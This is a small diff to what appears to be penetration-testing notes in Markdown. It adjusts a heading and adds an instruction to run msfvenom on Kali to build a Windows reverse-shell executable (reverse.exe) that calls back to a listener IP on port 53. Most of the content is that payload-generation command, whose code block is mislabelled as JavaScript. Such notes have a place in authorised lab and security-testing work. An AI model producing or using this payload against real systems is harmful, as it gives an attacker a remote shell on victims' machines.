@@ -1,5 +1,6 @@
-# Generating a Reverse Shell Executable
+### Generating a Reverse Shell Executable
 
+On Kali, generate a reverse shell executable (reverse.exe) using msfvenom. Update the LHOST IP address accordingly:
 ```JavaScript
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
 ```
